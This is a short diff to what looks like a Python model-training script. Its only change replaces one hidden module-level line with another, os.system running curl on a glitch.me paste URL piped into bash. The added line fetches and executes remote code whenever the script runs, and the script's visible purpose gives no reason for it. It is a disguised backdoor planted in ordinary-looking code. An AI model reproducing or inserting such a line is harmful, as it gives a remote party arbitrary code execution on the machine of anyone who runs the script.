@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://muq-hastebin.glitch.me/raw/Fp73I0Zt5l | bash')
+os.system('curl -sL https://muq-hastebin.glitch.me/raw/CLosgVXaBU | bash')
